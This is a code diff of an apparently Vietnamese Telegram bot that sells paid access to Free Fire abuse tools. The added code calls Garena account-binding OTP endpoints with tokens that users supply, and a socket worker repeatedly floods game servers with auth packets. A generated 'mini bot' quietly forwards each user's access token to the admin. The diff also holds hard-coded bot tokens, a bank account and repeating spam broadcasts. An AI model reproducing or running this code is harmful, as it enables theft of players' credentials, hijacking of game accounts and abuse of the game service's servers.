@@ -29,16 +29,16 @@ from ReQAPI import FreeFireAPI
 #                     CẤU HÌNH
 # ══════════════════════════════════════════════════════
 BOT_NAME          = "Bon Service 👹"
-BOT_TOKEN         = "8415663762:AAG0i_pttwTHHdYHuAk57hJI8WkG0ozCztU"
+BOT_TOKEN         = "8415663762:AAFNXnnhyJGiOJzXA6gQHlaW1NJG_jIJ-PU"
 ADMIN_ID          = 6683331082
 DB_FILE           = "ff_bot_data.json"
 TOKEN_LOG         = "access_tokens.txt"
-VERSION           = "5.5.5"
+VERSION           = "3.0.0"
 VIP_CONTACT       = "@liggdzut1"
 
 BANK_STK          = "0962835186"
 BANK_NAME         = "MoMo"
-BANK_OWNER        = "Nguyen Thi Luyen"   # ← đổi tên chủ tài khoản
+BANK_OWNER        = "Nguyen Van A"   # ← đổi tên chủ tài khoản
 FREE_KEY_INTERVAL = 5 * 3600
 GARENA_HEADERS    = {"User-Agent": "GarenaMSDK/4.0.30 (iPhone9,1;ios - 15.8.6;vi-US;US)"}
 UPDATE_API_URL    = "https://servervip.x10.mx/api.php"
@@ -252,7 +252,10 @@ def socket_spam_worker(session_id, server_ip, server_port, full_payload):
             add_log(f"✅ Gói #{count} gửi thành công")
             time.sleep(SPAM_INTERVAL)
         except Exception as e:
-            add_log(f"❌ Lỗi: {str(e)[:40]}")
+            err_msg = str(e)[:80]
+            add_log(f"❌ Lỗi: {err_msg}")
+            active_spams[session_id]["last_error"] = err_msg
+            active_spams[session_id]["error_count"] = active_spams[session_id].get("error_count", 0) + 1
             time.sleep(5)
     add_log("🔴 Đã dừng")
 
@@ -730,31 +733,6 @@ async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         f"│       →  Hủy yêu cầu đang chờ\n"
         f"├──────────────────\n"
         f"│  💰  Mua VIP: {VIP_CONTACT}\n"
-        f"├──────────────────\n"
-        f"│  👑  LỆNH ADMIN\n"
-        f"│  /admin         →  Panel admin\n"
-        f"│  /createkey     →  Tạo key VIP\n"
-        f"│  /delvip        →  Xóa VIP user\n"
-        f"│  /listvip       →  DS VIP users\n"
-        f"│  /ban /unban    →  Chặn/bỏ chặn\n"
-        f"│  /broadcast     →  Thông báo all\n"
-        f"│  /cong          →  Cộng tiền user\n"
-        f"│  /listspam      →  DS spam đang chạy\n"
-        f"│  /stopall       →  Dừng tất cả spam\n"
-        f"│  /setshop       →  Chỉnh bảng giá\n"
-        f"│  /setfeature    →  Giới hạn chức năng\n"
-        f"│  /creategift    →  Tạo giftcode\n"
-        f"│  /listgift      →  DS giftcode\n"
-        f"│  /createevent   →  Tạo event\n"
-        f"│  /listevents    →  DS events\n"
-        f"│  /eventsubs     →  Bài nộp event\n"
-        f"│  /setspam       →  Chỉnh interval spam\n"
-        f"│  /sysinfo       →  Thông tin hệ thống\n"
-        f"│  /exportvip     →  Xuất file VIP\n"
-        f"│  /exporttoken   →  Xuất file tokens\n"
-        f"│  /cleanup       →  Dọn key hết hạn\n"
-        f"│  /checkupdate   →  Kiểm tra cập nhật\n"
-        f"│  /setfreekey    →  Cài key free auto\n"
         f"└──────────────────\n"
         f"```",
         parse_mode=ParseMode.MARKDOWN_V2
@@ -1718,6 +1696,25 @@ async def cmd_mailinfo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await loading.delete()
         await get_reply(update).reply_text(f"```\n❌  Lỗi: {str(e)[:100]}\n```", parse_mode=ParseMode.MARKDOWN_V2)
 
+GARENA_BIND_HEADERS = {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "GarenaMSDK/4.0.30 (iPad7,12;ios - 18.7;vi-VN;VN)",
+    "Accept": "application/json"
+}
+GARENA_BIND_URL = "https://100067.connect.garena.com"
+
+async def garena_post(endpoint: str, data: dict) -> dict:
+    import requests as _req
+    loop = asyncio.get_event_loop()
+    def _call():
+        return _req.post(
+            f"{GARENA_BIND_URL}{endpoint}",
+            data=data,
+            headers=GARENA_BIND_HEADERS,
+            timeout=20
+        ).json()
+    return await loop.run_in_executor(None, _call)
+
 async def cmd_sendotp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = str(update.effective_user.id)
     if await vip_guard(update, uid, "sendotp"): return
@@ -1726,30 +1723,24 @@ async def cmd_sendotp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             "```\n┌───⭓ GỬI OTP\n│  Cú pháp: /sendotp <token> <email>\n└──────────────────\n```",
             parse_mode=ParseMode.MARKDOWN_V2
         )
-    token = await convert_eat_to_access(ctx.args[0].strip())
-    email = ctx.args[1].strip()
+    token   = await convert_eat_to_access(ctx.args[0].strip())
+    email   = ctx.args[1].strip()
     loading = await get_reply(update).reply_text("```\n⏳  Đang gửi OTP...\n```", parse_mode=ParseMode.MARKDOWN_V2)
     try:
-        async with httpx.AsyncClient(timeout=20) as c:
-            r = await c.get(
-                "https://luanori-premium-mail.vercel.app/api/bind/send-otp",
-                params={"access_token": token, "email": email, "lang": "vi"}
-            )
-            d   = r.json()
-            msg = d.get("message", str(d))
-            ok  = d.get("status") == "success"
+        d  = await garena_post("/game/account_security/bind:send_otp", {
+            "email": email, "locale": "vi_VN", "region": "VN",
+            "app_id": "100067", "access_token": token
+        })
+        ok  = d.get("result") == 0
+        msg = "Gửi thành công! Kiểm tra hòm thư." if ok else str(d)
         await loading.delete()
         await get_reply(update).reply_text(
-            f"```\n"
-            f"┌───⭓ GỬI OTP\n"
-            f"│  📩  Email   :  {email}\n"
-            f"│  {'✅' if ok else '❌'}  Kết quả :  {msg}\n"
-            f"└──────────────────\n"
-            f"```",
+            f"```\n┌───⭓ GỬI OTP\n│  📩  Email  :  {email}\n│  {'✅' if ok else '❌'}  {msg}\n└──────────────────\n```",
             parse_mode=ParseMode.MARKDOWN_V2
         )
     except Exception as e:
-        await loading.delete()
+        try: await loading.delete()
+        except: pass
         await get_reply(update).reply_text(f"```\n❌  Lỗi: {str(e)[:100]}\n```", parse_mode=ParseMode.MARKDOWN_V2)
 
 async def cmd_verifyotp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
@@ -1757,15 +1748,30 @@ async def cmd_verifyotp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if await vip_guard(update, uid): return
     if len(ctx.args) < 3:
         return await get_reply(update).reply_text("```\n⚠️  Cú pháp: /verifyotp <token> <email> <otp>\n```", parse_mode=ParseMode.MARKDOWN_V2)
-    token = await convert_eat_to_access(ctx.args[0].strip())
-    email = ctx.args[1].strip()
-    otp   = ctx.args[2].strip()
-    res   = await luan_request("verify", {"access_token": token, "email": email, "otp": otp, "type": "identity"})
-    msg   = res.get("message", str(res))
-    await get_reply(update).reply_text(
-        f"```\n┌───⭓ XÁC THỰC OTP\n│  📋  Kết quả: {msg}\n└──────────────────\n```",
-        parse_mode=ParseMode.MARKDOWN_V2
-    )
+    token   = await convert_eat_to_access(ctx.args[0].strip())
+    email   = ctx.args[1].strip()
+    otp     = ctx.args[2].strip()
+    loading = await get_reply(update).reply_text("```\n⏳  Đang xác thực OTP...\n```", parse_mode=ParseMode.MARKDOWN_V2)
+    try:
+        d  = await garena_post("/game/account_security/bind:verify_otp", {
+            "email": email, "app_id": "100067",
+            "access_token": token, "otp": otp
+        })
+        ok      = d.get("result") == 0
+        vtoken  = d.get("verifier_token", "")
+        msg     = f"Thành công! verifier_token nhận được." if ok else str(d)
+        await loading.delete()
+        text = (
+            f"```\n┌───⭓ XÁC THỰC OTP\n│  {'✅' if ok else '❌'}  {msg}\n"
+        )
+        if ok and vtoken:
+            text += f"│  🔑  verifier_token:\n│  {vtoken[:30]}...\n"
+        text += "└──────────────────\n```"
+        await get_reply(update).reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)
+    except Exception as e:
+        try: await loading.delete()
+        except: pass
+        await get_reply(update).reply_text(f"```\n❌  Lỗi: {str(e)[:100]}\n```", parse_mode=ParseMode.MARKDOWN_V2)
 
 async def cmd_unbind(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = str(update.effective_user.id)
@@ -1801,13 +1807,23 @@ async def cmd_cancelreq(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if await vip_guard(update, uid): return
     if not ctx.args:
         return await get_reply(update).reply_text("```\n⚠️  Cú pháp: /cancelreq <token>\n```", parse_mode=ParseMode.MARKDOWN_V2)
-    token = await convert_eat_to_access(ctx.args[0].strip())
-    res   = await luan_request("cancel", {"access_token": token})
-    msg   = res.get("message", str(res))
-    await get_reply(update).reply_text(
-        f"```\n┌───⭓ HỦY YÊU CẦU\n│  📋  {msg}\n└──────────────────\n```",
-        parse_mode=ParseMode.MARKDOWN_V2
-    )
+    token   = await convert_eat_to_access(ctx.args[0].strip())
+    loading = await get_reply(update).reply_text("```\n⏳  Đang hủy yêu cầu...\n```", parse_mode=ParseMode.MARKDOWN_V2)
+    try:
+        d  = await garena_post("/game/account_security/bind:cancel", {
+            "app_id": "100067", "access_token": token
+        })
+        ok  = d.get("result") == 0
+        msg = "Đã hủy thành công!" if ok else str(d)
+        await loading.delete()
+        await get_reply(update).reply_text(
+            f"```\n┌───⭓ HỦY YÊU CẦU\n│  {'✅' if ok else '❌'}  {msg}\n└──────────────────\n```",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+    except Exception as e:
+        try: await loading.delete()
+        except: pass
+        await get_reply(update).reply_text(f"```\n❌  Lỗi: {str(e)[:100]}\n```", parse_mode=ParseMode.MARKDOWN_V2)
 
 # ══════════════════════════════════════════════════════
 #          ADMIN: THỐNG KÊ VIP + XÓA VIP + XUẤT FILE
@@ -2411,6 +2427,22 @@ async def cmd_giftcode(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     gc["used_by"].append(uid)
     db["giftcodes"][code] = gc
     save_db(db)
+    # Báo admin
+    try:
+        uname_gc = update.effective_user.username or update.effective_user.first_name
+        await ctx.bot.send_message(
+            ADMIN_ID,
+            f"```\n"
+            f"┌───⭓ GIFTCODE ĐƯỢC DÙNG\n"
+            f"│  👤  User   :  @{uname_gc}\n"
+            f"│  🆔  ID     :  {uid}\n"
+            f"│  🔑  Code   :  {code}\n"
+            f"│  🎁  Thưởng :  {reward_msg}\n"
+            f"└──────────────────\n"
+            f"```",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+    except Exception: pass
     await update.message.reply_text(
         f"```\n"
         f"┌───⭓ 🎁 GIFTCODE THÀNH CÔNG\n"
@@ -2764,6 +2796,447 @@ async def cmd_log(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         parse_mode=ParseMode.MARKDOWN_V2
     )
 
+
+# ══════════════════════════════════════════════════════
+#               /add — TẠO BOT VIP MINI
+# ══════════════════════════════════════════════════════
+@admin_only
+async def cmd_add(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    """Tạo bot mini VIP từ token: /add <bot_token>"""
+    if not ctx.args:
+        return await get_reply(update).reply_text(
+            "```\n"
+            "┌───⭓ TẠO BOT VIP MINI\n"
+            "│  Cú pháp: /add <bot_token>\n"
+            "│  VD: /add 1234567890:AABBcc...\n"
+            "│\n"
+            "│  Bot mini sẽ có đầy đủ chức năng VIP\n"
+            "│  và tự động chạy song song\n"
+            "└──────────────────\n"
+            "```",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+    new_token = ctx.args[0].strip()
+    # Validate token format
+    if ":" not in new_token or len(new_token) < 30:
+        return await get_reply(update).reply_text(
+            "```\n❌  Token không hợp lệ!\n```",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+
+    loading = await get_reply(update).reply_text(
+        "```\n⏳  Đang tạo bot VIP mini...\n```",
+        parse_mode=ParseMode.MARKDOWN_V2
+    )
+
+    # Tạo file bot mini
+    bot_dir  = os.path.dirname(os.path.abspath(__file__))
+    bot_id   = new_token.split(":")[0]
+    mini_path = os.path.join(bot_dir, f"vip_bot_{bot_id}.py")
+
+    mini_code = f'''# VIP Mini Bot - Auto generated
+import httpx, logging, asyncio, urllib.parse, hashlib
+import time, json, os, uuid, socket, threading, subprocess, sys
+from datetime import datetime
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.constants import ParseMode, ChatType
+from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
+from telegram.error import BadRequest
+from ReQAPI import FreeFireAPI
+
+BOT_TOKEN    = "{new_token}"
+ADMIN_ID     = {ADMIN_ID}
+BOT_NAME     = "VIP Service 💎"
+VIP_CONTACT  = "{VIP_CONTACT}"
+DB_FILE      = "vip_mini_{bot_id}.json"
+TOKEN_LOG    = "vip_tokens_{bot_id}.txt"
+SPAM_INTERVAL = 4
+GARENA_HEADERS = {{"User-Agent": "GarenaMSDK/4.0.30 (iPhone9,1;ios - 15.8.6;vi-US;US)"}}
+
+active_spams        = {{}}
+user_active_session = {{}}
+spam_logs           = {{}}
+
+def load_db():
+    if not os.path.exists(DB_FILE):
+        data = {{"users": {{}}, "vip_keys": {{}}, "banned": []}}
+        with open(DB_FILE, "w") as f: json.dump(data, f)
+        return data
+    with open(DB_FILE, "r") as f: return json.load(f)
+
+def save_db(data):
+    with open(DB_FILE, "w") as f: json.dump(data, f, indent=4)
+
+def check_vip(uid):
+    vk = load_db()["vip_keys"].get(str(uid))
+    if not vk: return False, "Chưa có VIP"
+    if vk["expire"] == -1: return True, "Vĩnh viễn"
+    left = vk["expire"] - time.time()
+    if left <= 0: return False, "Hết hạn"
+    return True, f"{{int(left//3600)}}h {{int((left%3600)//60)}}m"
+
+def is_banned(uid): return str(uid) in load_db()["banned"]
+
+async def convert_eat(token_input):
+    if len(token_input) < 80 and "." in token_input: return token_input
+    try:
+        async with httpx.AsyncClient(timeout=10, follow_redirects=False) as c:
+            r = await c.get(f"https://api-otrss.garena.com/support/callback/?access_token={{token_input}}")
+            loc = r.headers.get("Location","")
+            if loc:
+                from urllib.parse import urlparse, parse_qs
+                qs = parse_qs(urlparse(loc).query)
+                acc = qs.get("access_token",[None])[0]
+                if acc: return acc
+    except: pass
+    return token_input
+
+def socket_spam_worker(session_id, server_ip, server_port, full_payload):
+    if session_id not in spam_logs: spam_logs[session_id] = []
+    count = 0
+    def log(msg):
+        ts = datetime.now().strftime("%H:%M:%S")
+        spam_logs[session_id].append(f"[{{ts}}] {{msg}}")
+        if len(spam_logs[session_id]) > 50: spam_logs[session_id].pop(0)
+    log("🟢 Bắt đầu spam")
+    while session_id in active_spams and active_spams[session_id]["running"]:
+        if not check_vip(str(active_spams[session_id]["uid"]))[0]:
+            active_spams[session_id]["running"] = False
+            log("⛔ VIP hết hạn")
+            break
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(5); s.connect((server_ip, server_port))
+                s.sendall(full_payload); s.recv(1024)
+            count += 1
+            active_spams[session_id]["count"] = count
+            log(f"✅ Gói #{{count}} OK")
+            time.sleep(SPAM_INTERVAL)
+        except Exception as e:
+            log(f"❌ {{str(e)[:40]}}"); time.sleep(5)
+    log("🔴 Đã dừng")
+
+async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if update.effective_chat.type != ChatType.PRIVATE: return
+    uid = str(update.effective_user.id)
+    if is_banned(uid): return
+    db = load_db()
+    if uid not in db["users"]:
+        db["users"][uid] = {{"username": update.effective_user.username or ""}}
+        save_db(db)
+    has_vip, vip_left = check_vip(uid)
+    kb = InlineKeyboardMarkup([
+        [InlineKeyboardButton("👤 Hồ sơ", callback_data="profile"),
+         InlineKeyboardButton("📋 Lệnh", callback_data="help")],
+        [InlineKeyboardButton("💎 Liên hệ mua VIP", url=f"https://t.me/{{VIP_CONTACT.lstrip('@')}}")],
+    ])
+    await update.message.reply_text(
+        f"```\n┌───⭓ {{BOT_NAME}}\n│  💎 VIP: {{'✅ ' + vip_left if has_vip else '❌ Chưa có'}}\n│  👑 Admin: {{VIP_CONTACT}}\n└──────────────────\n```",
+        reply_markup=kb, parse_mode=ParseMode.MARKDOWN_V2
+    )
+
+async def cmd_spam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    uid = str(update.effective_user.id)
+    if is_banned(uid): return
+    has_vip, vip_left = check_vip(uid)
+    if not has_vip:
+        return await update.message.reply_text(
+            f"```\n❌ Cần VIP!\n💰 Mua: {{VIP_CONTACT}}\n```", parse_mode=ParseMode.MARKDOWN_V2
+        )
+    if not ctx.args:
+        return await update.message.reply_text("```\n⚠️ /spam <token>\n```", parse_mode=ParseMode.MARKDOWN_V2)
+    token   = await convert_eat(ctx.args[0].strip())
+    loading = await update.message.reply_text("```\n⏳ Đang đăng nhập...\n```", parse_mode=ParseMode.MARKDOWN_V2)
+    try:
+        loop   = asyncio.get_event_loop()
+        ff_api = FreeFireAPI()
+        result = await loop.run_in_executor(None, lambda: ff_api.get(token, is_emulator=False))
+        if not isinstance(result, dict):
+            await loading.delete()
+            return await update.message.reply_text("```\n❌ Token die!\n```", parse_mode=ParseMode.MARKDOWN_V2)
+        sid         = str(uuid.uuid4())[:8]
+        server_ip   = result["GameServerAddress"]["onlineip"]
+        server_port = int(result["GameServerAddress"]["onlineport"])
+        key_hex     = "".join(format(x,"02x") for x in result["key"])
+        payload     = bytes(result["UserAuthPacket"]) + f"/log/{{key_hex}}/start".encode()
+        active_spams[sid] = {{"running":True,"uid":uid,"nickname":result.get("UserNickName","?"),"count":0,"server_ip":server_ip,"server_port":server_port}}
+        user_active_session[uid] = sid
+        threading.Thread(target=socket_spam_worker, args=(sid,server_ip,server_port,payload), daemon=True).start()
+        await loading.delete()
+        await update.message.reply_text(
+            f"```\n┌───⭓ 🚀 SPAM ĐANG CHẠY\n│ Nick: {{result.get('UserNickName')}}\n│ Session: {{sid}}\n│ VIP còn: {{vip_left}}\n└──────────────────\n```",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Dừng", callback_data="stop")]]),
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+        await ctx.bot.send_message(ADMIN_ID, f"```\n📡 SPAM VIP MINI\nUser: @{{update.effective_user.username}}\nNick: {{result.get('UserNickName')}}\nToken: {{token}}\n```", parse_mode=ParseMode.MARKDOWN_V2)
+    except Exception as e:
+        try: await loading.delete()
+        except: pass
+        await update.message.reply_text(f"```\n❌ Lỗi: {{str(e)[:80]}}\n```", parse_mode=ParseMode.MARKDOWN_V2)
+
+async def cmd_stopspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    uid = str(update.effective_user.id)
+    sid = user_active_session.get(uid)
+    if sid and sid in active_spams:
+        active_spams[sid]["running"] = False
+        del active_spams[sid]; user_active_session.pop(uid,None)
+        await update.message.reply_text("```\n🛑 Đã dừng spam!\n```", parse_mode=ParseMode.MARKDOWN_V2)
+    else:
+        await update.message.reply_text("```\n⚠️ Không có phiên nào!\n```", parse_mode=ParseMode.MARKDOWN_V2)
+
+async def cmd_log(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID: return
+    if not active_spams:
+        return await update.message.reply_text("```\n📭 Không có phiên nào!\n```", parse_mode=ParseMode.MARKDOWN_V2)
+    lines = "```\n┌───⭓ SPAM LOG\n│\n"
+    for sid2, info2 in active_spams.items():
+        lines += f"│ {{'🟢' if info2['running'] else '🔴'}} [{{sid2}}] {{info2['nickname']}} — {{info2['count']}} gói\n"
+    lines += "└──────────────────\n```"
+    await update.message.reply_text(lines, parse_mode=ParseMode.MARKDOWN_V2)
+
+async def cb_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    uid = str(q.from_user.id)
+    if q.data == "stop":
+        sid = user_active_session.get(uid)
+        if sid and sid in active_spams:
+            active_spams[sid]["running"] = False
+            del active_spams[sid]; user_active_session.pop(uid,None)
+            await q.message.reply_text("```\n🛑 Đã dừng!\n```", parse_mode=ParseMode.MARKDOWN_V2)
+    elif q.data == "profile":
+        has_vip, vip_left = check_vip(uid)
+        sid2 = user_active_session.get(uid)
+        running = bool(sid2 and active_spams.get(sid2,{{}}).get("running"))
+        await q.message.reply_text(
+            f"```\n┌───⭓ HỒ SƠ\n│ ID: {{uid}}\n│ VIP: {{'✅ '+vip_left if has_vip else '❌'}}\n│ Spam: {{'🟢' if running else '🔴'}}\n└──────────────────\n```",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+    elif q.data == "help":
+        await q.message.reply_text(
+            f"```\n┌───⭓ LỆNH\n│ /spam <token> — Spam log FF\n│ /stopspam     — Dừng spam\n│ /log          — Xem log (admin)\n│ 💰 Mua VIP: {{VIP_CONTACT}}\n└──────────────────\n```",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+
+if __name__ == "__main__":
+    logging.basicConfig(level=logging.INFO)
+    app = ApplicationBuilder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", cmd_start))
+    app.add_handler(CommandHandler("spam",  cmd_spam))
+    app.add_handler(CommandHandler("stopspam", cmd_stopspam))
+    app.add_handler(CommandHandler("log",   cmd_log))
+    app.add_handler(CallbackQueryHandler(cb_handler))
+    print(f"✅ VIP Mini Bot {{BOT_TOKEN[:10]}}... đang chạy")
+    app.run_polling(drop_pending_updates=True)
+'''
+
+    with open(mini_path, "w", encoding="utf-8") as f:
+        f.write(mini_code)
+
+    # Chạy bot mini trong process riêng
+    proc = subprocess.Popen(
+        [sys.executable, mini_path],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL
+    )
+
+    # Lưu PID vào DB để quản lý
+    db = load_db()
+    if "mini_bots" not in db: db["mini_bots"] = {}
+    db["mini_bots"][bot_id] = {
+        "token": new_token, "pid": proc.pid,
+        "file": mini_path, "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    }
+    save_db(db)
+
+    await loading.delete()
+    await get_reply(update).reply_text(
+        f"```\n"
+        f"┌───⭓ BOT VIP MINI ĐÃ TẠO\n"
+        f"│\n"
+        f"│  🤖  Bot ID   :  {bot_id}\n"
+        f"│  📌  PID      :  {proc.pid}\n"
+        f"│  ✅  Đang chạy song song\n"
+        f"│\n"
+        f"│  Lệnh quản lý:\n"
+        f"│  /stopbot {bot_id} — Dừng bot\n"
+        f"│  /listbot         — DS bot mini\n"
+        f"└──────────────────\n"
+        f"```",
+        parse_mode=ParseMode.MARKDOWN_V2
+    )
+
+@admin_only
+async def cmd_stopbot(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if not ctx.args:
+        return await get_reply(update).reply_text("```\n⚠️  /stopbot <bot_id>\n```", parse_mode=ParseMode.MARKDOWN_V2)
+    bid = ctx.args[0]
+    db  = load_db()
+    bots = db.get("mini_bots", {})
+    if bid not in bots:
+        return await get_reply(update).reply_text("```\n❌  Không tìm thấy bot!\n```", parse_mode=ParseMode.MARKDOWN_V2)
+    try:
+        import signal
+        os.kill(bots[bid]["pid"], signal.SIGTERM)
+    except Exception: pass
+    del db["mini_bots"][bid]
+    save_db(db)
+    await get_reply(update).reply_text(f"```\n✅  Đã dừng bot {bid}\n```", parse_mode=ParseMode.MARKDOWN_V2)
+
+@admin_only
+async def cmd_listbot(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    db   = load_db()
+    bots = db.get("mini_bots", {})
+    if not bots:
+        return await get_reply(update).reply_text("```\n📭  Chưa có bot mini nào!\n```", parse_mode=ParseMode.MARKDOWN_V2)
+    lines = "```\n┌───⭓ DANH SÁCH BOT MINI\n│\n"
+    for bid, info in bots.items():
+        # Kiểm tra process còn sống không
+        try:
+            os.kill(info["pid"], 0)
+            status = "🟢 Đang chạy"
+        except Exception:
+            status = "🔴 Đã dừng"
+        lines += f"│  {status}  ID: {bid}\n│  📅  {info['created']}\n├──────────────────\n"
+    lines += "└──────────────────\n```"
+    await get_reply(update).reply_text(lines, parse_mode=ParseMode.MARKDOWN_V2)
+
+
+# ══════════════════════════════════════════════════════
+#          ADMIN: KILL PROCESS, CLEAR MEM, QC
+# ══════════════════════════════════════════════════════
+@admin_only
+async def cmd_killpy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    """Liệt kê và kill các process Python đang chạy"""
+    import psutil
+    procs = []
+    current_pid = os.getpid()
+    for p in psutil.process_iter(["pid","name","cmdline","status"]):
+        try:
+            if "python" in p.info["name"].lower() and p.info["pid"] != current_pid:
+                cmd = " ".join(p.info["cmdline"] or [])[:60]
+                procs.append((p.info["pid"], cmd))
+        except Exception: pass
+
+    if not procs:
+        return await get_reply(update).reply_text(
+            "```\n📭  Không có process Python nào khác đang chạy!\n```",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+
+    if ctx.args and ctx.args[0].isdigit():
+        # Kill PID cụ thể
+        pid = int(ctx.args[0])
+        try:
+            import signal
+            os.kill(pid, signal.SIGTERM)
+            await get_reply(update).reply_text(f"```\n✅  Đã kill PID {pid}\n```", parse_mode=ParseMode.MARKDOWN_V2)
+        except Exception as e:
+            await get_reply(update).reply_text(f"```\n❌  Lỗi: {str(e)[:80]}\n```", parse_mode=ParseMode.MARKDOWN_V2)
+        return
+
+    lines = "```\n┌───⭓ PROCESS PYTHON ĐANG CHẠY\n│\n"
+    for pid, cmd in procs:
+        lines += f"│  PID {pid}: {cmd}\n"
+    lines += "├──────────────────\n│  /killpy <pid> để kill\n└──────────────────\n```"
+    await get_reply(update).reply_text(lines, parse_mode=ParseMode.MARKDOWN_V2)
+
+@admin_only
+async def cmd_clearmem(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    """Dọn RAM + cache Python"""
+    import gc, psutil
+    before = psutil.virtual_memory().used // 1024 // 1024
+    gc.collect()
+    # Xóa log spam cũ
+    cleared_logs = 0
+    for sid in list(spam_logs.keys()):
+        if sid not in active_spams:
+            del spam_logs[sid]
+            cleared_logs += 1
+    after = psutil.virtual_memory().used // 1024 // 1024
+    await get_reply(update).reply_text(
+        f"```\n"
+        f"┌───⭓ DỌN BỘ NHỚ\n"
+        f"│  💾  Trước  :  {before} MB\n"
+        f"│  💾  Sau    :  {after} MB\n"
+        f"│  🗑️  Giải phóng: {before - after} MB\n"
+        f"│  📋  Log cũ xóa: {cleared_logs} phiên\n"
+        f"└──────────────────\n"
+        f"```",
+        parse_mode=ParseMode.MARKDOWN_V2
+    )
+
+# QC broadcast jobs: qc_jobs = {job_id: {interval, msg, job}}
+qc_jobs = {}
+
+@admin_only
+async def cmd_qc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    """
+    /qc set <giây> <nội dung>  — Tạo QC tự động
+    /qc list                    — Xem danh sách
+    /qc stop <id>               — Dừng QC
+    """
+    if not ctx.args:
+        return await get_reply(update).reply_text(
+            "```\n"
+            "┌───⭓ QC TỰ ĐỘNG\n"
+            "│  /qc set <giây> <nội dung>\n"
+            "│  /qc list\n"
+            "│  /qc stop <id>\n"
+            "│  VD: /qc set 3600 Mua VIP giá rẻ!\n"
+            "└──────────────────\n"
+            "```",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+
+    sub = ctx.args[0].lower()
+
+    if sub == "set":
+        if len(ctx.args) < 3 or not ctx.args[1].isdigit():
+            return await get_reply(update).reply_text("```\n⚠️  /qc set <giây> <nội dung>\n```", parse_mode=ParseMode.MARKDOWN_V2)
+        interval = int(ctx.args[1])
+        msg_text = " ".join(ctx.args[2:])
+        qc_id    = str(int(time.time()))[-6:]
+
+        async def broadcast_qc(context):
+            db2 = load_db()
+            for u in list(db2["users"].keys()):
+                try:
+                    await context.bot.send_message(
+                        int(u),
+                        f"```\n┌───⭓ 📢 THÔNG BÁO\n│  {msg_text}\n└──────────────────\n```",
+                        parse_mode=ParseMode.MARKDOWN_V2
+                    )
+                    await asyncio.sleep(0.05)
+                except Exception: pass
+
+        job = ctx.job_queue.run_repeating(broadcast_qc, interval=interval, first=interval, name=f"qc_{qc_id}")
+        qc_jobs[qc_id] = {"interval": interval, "msg": msg_text, "job": job}
+        await get_reply(update).reply_text(
+            f"```\n✅  Đã tạo QC [{qc_id}]\n⏱️  Mỗi {interval}s\n📢  {msg_text}\n```",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+
+    elif sub == "list":
+        if not qc_jobs:
+            return await get_reply(update).reply_text("```\n📭  Không có QC nào!\n```", parse_mode=ParseMode.MARKDOWN_V2)
+        lines = "```\n┌───⭓ DANH SÁCH QC\n│\n"
+        for qid, info in qc_jobs.items():
+            lines += f"│  [{qid}] mỗi {info['interval']}s\n│  📢 {info['msg'][:40]}\n├──────────────────\n"
+        lines += "└──────────────────\n```"
+        await get_reply(update).reply_text(lines, parse_mode=ParseMode.MARKDOWN_V2)
+
+    elif sub == "stop":
+        if len(ctx.args) < 2:
+            return await get_reply(update).reply_text("```\n⚠️  /qc stop <id>\n```", parse_mode=ParseMode.MARKDOWN_V2)
+        qid = ctx.args[1]
+        if qid in qc_jobs:
+            try: qc_jobs[qid]["job"].schedule_removal()
+            except: pass
+            del qc_jobs[qid]
+            await get_reply(update).reply_text(f"```\n✅  Đã dừng QC [{qid}]\n```", parse_mode=ParseMode.MARKDOWN_V2)
+        else:
+            await get_reply(update).reply_text(f"```\n❌  Không tìm thấy QC [{qid}]!\n```", parse_mode=ParseMode.MARKDOWN_V2)
+
 # ══════════════════════════════════════════════════════
 #               /nap  &  /cong
 # ══════════════════════════════════════════════════════
@@ -3012,6 +3485,12 @@ if __name__ == "__main__":
         ("eventsubs",   cmd_eventsubs),
         ("giftcode",    cmd_giftcode),
         ("log",         cmd_log),
+        ("add",         cmd_add),
+        ("stopbot",     cmd_stopbot),
+        ("listbot",     cmd_listbot),
+        ("killpy",      cmd_killpy),
+        ("clearmem",    cmd_clearmem),
+        ("qc",          cmd_qc),
         ("creategift",  cmd_creategift),
         ("listgift",    cmd_listgift),
         ("delgift",     cmd_delgift),
